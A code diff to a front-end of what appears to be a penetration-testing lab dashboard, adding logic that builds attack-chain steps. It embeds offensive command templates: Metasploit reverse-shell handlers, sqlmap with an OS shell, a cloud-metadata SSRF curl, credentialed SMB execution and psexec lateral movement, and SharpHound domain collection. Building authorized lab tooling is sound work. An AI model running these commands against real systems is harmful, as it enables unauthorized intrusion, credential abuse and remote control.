@@ -8,7 +8,7 @@ import { useAppStore } from '@/stores/appStore'
 interface NodeData {
   id: string
   label: string
-  type: 'attacker' | 'target'
+  type: 'attacker' | 'target' | 'ad_domain'
   target_type?: string
   compromised?: boolean
   finding_counts?: Record<string, number>
@@ -19,11 +19,16 @@ interface EdgeData {
   source: string
   target: string
   label: string
-  type: 'c2' | 'finding' | 'lateral'
+  type: 'c2' | 'finding' | 'lateral' | 'ad'
   count?: number
   username?: string
   session_type?: string
   status?: string
+  platform?: string
+  via_payload?: string
+  kind?: string
+  severity?: string
+  command?: string
 }
 
 interface GraphData {
@@ -57,12 +62,18 @@ const EDGE_TYPE_TOOL: Record<string, string> = {
   c2:      'C2 implant',
   finding: 'exploit',
   lateral: 'cred-reuse',
+  ad:      'AD',
 }
 
 const EDGE_TYPE_IMPACT: Record<string, string> = {
   c2:      'Critical',
   finding: 'High',
   lateral: 'Medium',
+  ad:      'High',
+}
+
+const SEVERITY_TO_IMPACT: Record<string, string> = {
+  critical: 'Critical', high: 'High', medium: 'Medium', low: 'Low', info: 'Info',
 }
 
 // ── Sub-components ────────────────────────────────────────────────────────────
@@ -107,6 +118,41 @@ function SevBadge({ sev }: { sev: string }) {
 
 // ── Build chains from graph data ───────────────────────────────────────────────
 
+// Picks the real re-exploit command for a C2 entry step instead of a
+// hardcoded windows/x64/meterpreter guess, which was wrong for e.g. a Linux
+// php/reverse_php shell -- exactly the kind of session this lab produces.
+function c2Command(entry: EdgeData): string {
+  if (entry.via_payload) {
+    return `use exploit/multi/handler; set PAYLOAD ${entry.via_payload}`
+  }
+  const platform = (entry.platform ?? '').toLowerCase()
+  if (platform.includes('win')) return 'use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp'
+  if (platform.includes('linux') || platform.includes('unix')) return 'use exploit/multi/handler; set PAYLOAD linux/x64/meterpreter/reverse_tcp'
+  if (platform.includes('osx') || platform.includes('mac')) return 'use exploit/multi/handler; set PAYLOAD osx/x64/meterpreter/reverse_tcp'
+  if (platform.includes('php')) return 'use exploit/multi/handler; set PAYLOAD php/meterpreter/reverse_tcp'
+  // No session platform/payload data at all -- the Windows default is a
+  // guess, not a known fact, so say so rather than presenting it as certain.
+  return 'use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp  # platform unknown, verify before running'
+}
+
+// Same idea for the "exploit a finding" entry step: nxc smb/psexec only
+// makes sense against a Windows/SMB-reachable network target, not a web
+// app or API endpoint (the lab's actual DVWA/Juice Shop/VAmPI targets).
+function findingCommand(targetType: string | undefined): string {
+  switch (targetType) {
+    case 'web_app':
+      return 'sqlmap -u "http://{target}/vuln.php?id=1" --batch --os-shell'
+    case 'api_endpoint':
+      return 'ffuf -u http://{target}/FUZZ -w endpoints.txt -mc 200,401,403'
+    case 'cloud_aws':
+    case 'cloud_azure':
+    case 'cloud_gcp':
+      return 'curl -s http://169.254.169.254/latest/meta-data/ # cloud metadata SSRF'
+    default:
+      return 'nxc smb {target} -u {user} -p {pass} --exec-method mmcexec'
+  }
+}
+
 function buildChains(graph: GraphData): AttackChain[] {
   const edges = graph.edges.map(e => e.data)
   const nodeMap = new Map(graph.nodes.map(n => [n.data.id, n.data]))
@@ -123,20 +169,33 @@ function buildChains(graph: GraphData): AttackChain[] {
 
     const findingCounts = target.finding_counts ?? {}
     const topSev = ['Critical', 'High', 'Medium', 'Low'].find(s => findingCounts[s.toLowerCase()] || findingCounts[s])
-    const impact = topSev ?? EDGE_TYPE_IMPACT[entry.type] ?? 'Medium'
+    const impact = entry.type === 'ad'
+      ? (SEVERITY_TO_IMPACT[entry.severity ?? 'medium'] ?? 'Medium')
+      : (topSev ?? EDGE_TYPE_IMPACT[entry.type] ?? 'Medium')
     const cvss = impact === 'Critical' ? 9.8 : impact === 'High' ? 7.5 : impact === 'Medium' ? 5.0 : 3.0
 
     const edgeTool = EDGE_TYPE_TOOL[entry.type] ?? 'access'
-    const entryStep: PathStep = entry.type === 'c2'
-      ? { tool: edgeTool, title: target.label, sev: impact, description: 'Deploy implant via exploit and establish callback', command: 'use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp' }
-      : entry.type === 'finding'
-        ? { tool: edgeTool, title: target.label, sev: impact, description: 'Exploit identified vulnerability to gain code execution', command: 'nxc smb {target} -u {user} -p {pass} --exec-method mmcexec' }
-        : { tool: edgeTool, title: target.label, sev: impact, description: 'Reuse captured credentials for lateral movement', command: 'impacket-psexec {domain}/{user}:{pass}@{target}' }
+    let entryStep: PathStep
+    let reconStep: PathStep
+    if (entry.type === 'c2') {
+      reconStep = { tool: 'recon', title: 'Initial recon', sev: 'Info', description: 'Enumerate open ports, services, and OS fingerprint', command: 'nmap -sV -sC -O -T4 {target}' }
+      entryStep = { tool: edgeTool, title: target.label, sev: impact, description: 'Deploy implant via exploit and establish callback', command: c2Command(entry) }
+    } else if (entry.type === 'finding') {
+      reconStep = { tool: 'recon', title: 'Initial recon', sev: 'Info', description: 'Enumerate open ports, services, and OS fingerprint', command: 'nmap -sV -sC -O -T4 {target}' }
+      entryStep = { tool: edgeTool, title: target.label, sev: impact, description: 'Exploit identified vulnerability to gain code execution', command: findingCommand(target.target_type) }
+    } else if (entry.type === 'ad') {
+      // Quick wins are domain-wide BloodHound/SharpHound findings (kerberoast,
+      // AS-REP, delegation, ...) -- the command is already the real,
+      // correctly-formed impacket/nxc command from services/ad_analysis.py,
+      // not a guess, so use it verbatim rather than synthesizing one.
+      reconStep = { tool: 'recon', title: 'Domain recon', sev: 'Info', description: 'Collect AD objects and relationships (BloodHound/SharpHound)', command: 'SharpHound.exe -c All' }
+      entryStep = { tool: edgeTool, title: entry.label, sev: impact, description: `${entry.count ?? 0} affected principal(s)`, command: entry.command || '# no command available' }
+    } else {
+      reconStep = { tool: 'recon', title: 'Initial recon', sev: 'Info', description: 'Enumerate open ports, services, and OS fingerprint', command: 'nmap -sV -sC -O -T4 {target}' }
+      entryStep = { tool: edgeTool, title: target.label, sev: impact, description: 'Reuse captured credentials for lateral movement', command: 'impacket-psexec {domain}/{user}:{pass}@{target}' }
+    }
 
-    const baseSteps: PathStep[] = [
-      { tool: 'recon', title: 'Initial recon', sev: 'Info', description: 'Enumerate open ports, services, and OS fingerprint', command: 'nmap -sV -sC -O -T4 {target}' },
-      entryStep,
-    ]
+    const baseSteps: PathStep[] = [reconStep, entryStep]
 
     // Check for lateral movement from this target
     const laterals = lateralEdges.filter(e => e.source === entry.target)
